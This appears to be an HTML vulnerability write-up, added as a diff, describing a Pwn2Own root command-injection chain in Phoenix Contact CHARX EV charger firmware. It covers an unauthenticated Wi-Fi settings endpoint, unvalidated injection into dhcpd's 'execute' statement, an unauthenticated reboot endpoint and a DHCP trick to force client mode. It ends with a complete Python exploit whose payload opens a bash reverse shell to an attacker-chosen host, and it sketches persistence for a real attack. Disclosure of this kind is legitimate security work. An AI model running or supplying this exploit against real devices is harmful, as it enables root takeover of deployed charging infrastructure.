@@ -1,0 +1,184 @@
+<h1 id="phoenix-contact-rce">Phoenix Contact RCE</h1>
+<a href="2025-charx-wape.html">[wape]</a>
+<link rel="stylesheet" href="style.css">
+<h2 id="brief">Brief</h2>
+<p>A vulnerability was introduced in the most recent version of Phoenix
+Contact’s firmware for the CHARX series.</p>
+<p>The vulnerability allows for command injection due to missing
+authentication, leading to code execution as root.</p>
+<h2 id="details">Details</h2>
+<p>An unauthenticated user can POST data to this endpoint and override
+the wifi configuration for the device.</p>
+<p>if <code>xaccess_point_service</code> is ran with the argument
+<code>start</code>, the code checks if the action in the configuration
+file is <code>access_point</code></p>
+<pre><code># Start the access point service
+def start():
+    log(f&quot;starting {SCRIPT_NAME}...&quot;)
+    data = get_access_point_data()
+    log(f&quot;{data}&quot;)
+    timeout = data.get(&#39;available_time&#39;, 0)
+    operation_mode = data.get(&quot;operation_mode&quot;)
+
+    if operation_mode == &quot;access_point&quot;:
+        update_config_files(data)
+        update_default_dhcp(add=True)
+        set_iface_mode_ap()
+        restart_dhcpd()
+        start_hostapd()
+        set_timeout(timeout)</code></pre>
+<p>If so, it calls <code>update_config_files</code></p>
+<pre><code>def update_config_files(config):
+    network_ip, netmask = split_network(config[&quot;network_cidr&quot;])
+    broadcast = get_network_broadcast(config[&quot;network_cidr&quot;])
+
+    set_interfaces(config[&#39;ip_address&#39;], netmask, broadcast)
+
+    set_dhcp_config(network_ip, netmask, config[&quot;ip_from&quot;], config[&quot;ip_to&quot;], config[&quot;ip_address&quot;])
+
+    set_hostapd_config(config[&quot;ssid&quot;], config[&quot;band&quot;], config[&#39;encryption&#39;][-1], config[&quot;password&quot;])
+
+    ip_address_cidr = f&quot;{config[&#39;ip_address&#39;]}/{config[&#39;network_cidr&#39;].split(&#39;/&#39;)[1]}&quot;
+    restart_network(ip_address_cidr)</code></pre>
+<p>which calls <code>set_dhcp_config</code>:</p>
+<pre><code># Set the DHCP configuration for the access point
+def set_dhcp_config(network, netmask, ip_from, ip_to, access_point_ip):
+    log(f&quot;updating {DHCPD_CONF_PATH}&quot;)
+    new_config = DHCPD_CONF.format(**{
+        &quot;network&quot;: network,
+        &quot;netmask&quot;: netmask,
+        &quot;ip_from&quot;: ip_from,
+        &quot;ip_to&quot;: ip_to,
+        &quot;access_point_ip&quot;: access_point_ip,
+    })
+    clear_config(DHCPD_CONF_PATH)
+    clear_config(DHCPD_CONF_PATH_2)
+    append_to_file(DHCPD_CONF_PATH, content=new_config)
+    append_to_file(DHCPD_CONF_PATH_2, content=new_config)</code></pre>
+<p>This function does two things. First, it clears the existing config
+from the file (using comment lines as start/stop markers).</p>
+<p>Second, it then writes the new config to the file to
+<code>/etc/dhcp/dhcpd.conf</code></p>
+<p><code>dhcpd</code> has an <code>execute</code> statement which allows
+you to execute external commands. Given that no validation is provided
+on the <code>ip_to</code> field, we can inject a command into this field
+and get it to execute when <code>dhcpd</code> parses the configuration
+file.</p>
+<h2 id="execution">Execution</h2>
+<p>Unfortunately, its hard to entice this behaviour, so we instead rely
+on another unauthenticated endpoint, <code>api/v1.0/reboot</code> in
+<code>api_reboot.so</code>, to reboot the device which triggers the
+parsing and execution of the command.</p>
+<p>This script only runs when the device is in client mode, and for the
+contest we need to exploit a server mode device. to resolve this, we use
+some behaviour of the device, DHCP bind scripts, to induce a switch.</p>
+<p>By advertising an IP address on the 192.168.4.0/24 range, we can get
+the device to reboot to client mode.</p>
+<p>In <code>/etc/udhcpc.d/60systemreconfigure</code>:</p>
+<pre><code>#!/bin/bash
+# /etc/udhcpc.d/60checkToSwitchToEv2000
+
+HOSTNAME_EV3000=&quot;ev3000&quot;
+SWITCH_SCRIPT=&quot;/usr/lib/charx-system-switch/switch-to-ev2000.sh&quot;
+
+RECONF_IP1_VALUE=192
+RECONF_IP2_VALUE=168
+RECONF_IP3_VALUE=4
+RECONF_IP4_LOWER_LIMIT=2
+RECONF_IP4_UPPER_LIMIT=128
+
+INTERVENTION_WAIT_TIME_SEC=180  # Allow for a &quot;stop&quot; in order to prevent boot loops
+
+reason=$1
+
+hostname=&quot;$(cat /etc/hostname)&quot; # SystemConfigManager might not be running in this Situation
+
+if [ &quot;$reason&quot; == &quot;bound&quot; ] &amp;&amp; [ &quot;$hostname&quot; == &quot;$HOSTNAME_EV3000&quot;  ];then
+    # DHCP has new address
+    ip_address=&quot;$(ifconfig eth0 | grep &#39;inet addr:&#39;| grep -v &#39;127.0.0.1&#39; | cut -d: -f2 | awk &#39;{ print $1}&#39;)&quot;
+    IFS=. read ip1 ip2 ip3 ip4 &lt;&lt;&lt; &quot;$ip_address&quot;
+    if [[ $ip1 -ge 0 ]] &amp;&amp; [[ $ip1 -le 255 ]] &amp;&amp; [[ $ip2 -ge 0 ]] &amp;&amp; [[ $ip2 -le 255 ]] &amp;&amp; [[ $ip3 -ge 0 ]] &amp;&amp; [[ $ip3 -le 255 ]] &amp;&amp; [[ $ip4 -ge 0 ]] &amp;&amp; [[ $ip4 -le 255 ]]; then
+        /usr/bin/logger &quot;recievied valid IPv4-Address via dhcp [$ip1.$ip2.$ip3.$ip4]&quot;
+        
+        if [[ $ip1 -eq $RECONF_IP1_VALUE ]] &amp;&amp; [[ $ip2 -eq $RECONF_IP2_VALUE ]] &amp;&amp; [[ $ip3 -eq $RECONF_IP3_VALUE ]] &amp;&amp; [[ $ip4 -ge $RECONF_IP4_LOWER_LIMIT ]] &amp;&amp; [[ $ip4 -le $RECONF_IP4_UPPER_LIMIT ]]; then
+            /usr/bin/logger &quot;System is set to ev3000 [hostname: $hostname] and has an ip-address of eth1 dhcp subnet [$ip1.$ip2.$ip3.$ip4]&quot;
+            /usr/bin/logger &quot;System will try to be set to ev2000&quot;
+            
+            /bin/sleep $INTERVENTION_WAIT_TIME_SEC &amp;&amp; $SWITCH_SCRIPT &amp;
+        fi
+    fi
+    
+fi</code></pre>
+<p>Finally then, to exploit a server mode device, we:</p>
+<ol type="1">
+<li>Advertise a 192.168.4.0/24 IP as a DHCP server, causing a
+reboot</li>
+<li>POST to the endpoint to inject a command</li>
+<li>POST to the restart to trigger a reboot.</li>
+</ol>
+<p>In testing, this takes around 9 minutes, but it might be possible to
+get the device to check for a new lease faster. Our expectation is that
+on first boot we can advertise, leading to a client mode switch early
+on.</p>
+<h2 id="repair">Repair</h2>
+<p>A usable exploit can be built with these primitives.</p>
+<p>For the sake of Pwn2Own we just make a reverse shell. As the device
+has no binary signing or authentication, a real attack would involve the
+replacement or creation of a file before calling
+<code>/usr/lib/charx-system-switch/switch-to-ev3000.sh</code> to revert
+back to server mode.</p>
+<h2 id="exploit">Exploit</h2>
+<pre><code>import argparse
+import json
+import requests
+from urllib.parse import urljoin
+
+
+class CharxTarget:
+    __slots__ = [&quot;__target_url&quot;, &quot;__is_client&quot;, &quot;__target_endpoint&quot;]
+
+    def __init__(self, url: str):
+        self.__target_url: str = url
+        self.__target_endpoint: str = urljoin(url, &quot;api/v1.0/Wifi/settings&quot;)
+
+    def exploit(self, callback_ip: str, callback_port: int):
+        # command: str = &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.2.36/1337 0&gt;&amp;1&quot;
+        # command: str = &quot;,&quot;.join([f&#39;&quot;{part}&quot;&#39; for part in shlex.split(command)])
+        # print(f&quot;split command: {command}&quot;)
+
+        data = {
+            &quot;operation_mode&quot;: &quot;access_point&quot;,
+            &quot;available_time&quot;: 1200,
+            &quot;band&quot;: &quot;g&quot;,
+            &quot;encryption&quot;: &quot;WPA2&quot;,
+            &quot;ip_address&quot;: &quot;192.168.1.1&quot;,
+            &quot;ip_from&quot;: &quot;192.168.1.100&quot;,
+            &quot;ip_to&quot;: &#39;192.168.1.254;}\nexecute(&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/&#39; + callback_ip + &#39;/&#39; + str(callback_port) + &#39; 0&gt;&amp;1&quot;);\nsubnet 192.168.13.0 netmask 255.255.255.0 {set pew = 1&#39;,
+            &quot;ssid&quot;: &quot;CHARX_AP&quot;,
+            &quot;network_cidr&quot;: &quot;192.168.1.0/24&quot;,
+            &quot;password&quot;: &quot;CHARX_Passwordl&quot;,
+            &quot;connect_network&quot;: &quot;&quot;,
+            &quot;country_code&quot;: &quot;DE&quot;,
+            &quot;enable_access_point&quot;: True,
+            &quot;enable_wifi&quot;: False,
+        }
+
+        r = requests.post(self.__target_endpoint, data={&quot;value&quot;: json.dumps(data)})
+        print(f&quot;Response to injection: {r.status_code}&quot;)
+
+        r = requests.post(urljoin(self.__target_url, &quot;api/v1.0/reboot&quot;))
+        print(f&quot;Response to reboot: {r.status_code}&quot;)
+
+        r = requests.get(self.__target_endpoint)
+        print(r.text)
+
+
+if __name__ == &quot;__main__&quot;:
+    args = argparse.ArgumentParser(description=&quot;charx RCE&quot;)
+    args.add_argument(&quot;--url&quot;, type=str, required=True, help=&quot;Web UI base URL (e.g http://192.168.2.38:5001/&quot;)
+    args.add_argument(&quot;--ip&quot;, type=str, required=True, help=&quot;The IP to connect to&quot;)
+    args.add_argument(&quot;--port&quot;, type=str, required=True, help=&quot;The port to connect to&quot;)
+
+    args = args.parse_args()
+    CharxTarget(args.url).exploit(args.ip, args.port)
+</code></pre>
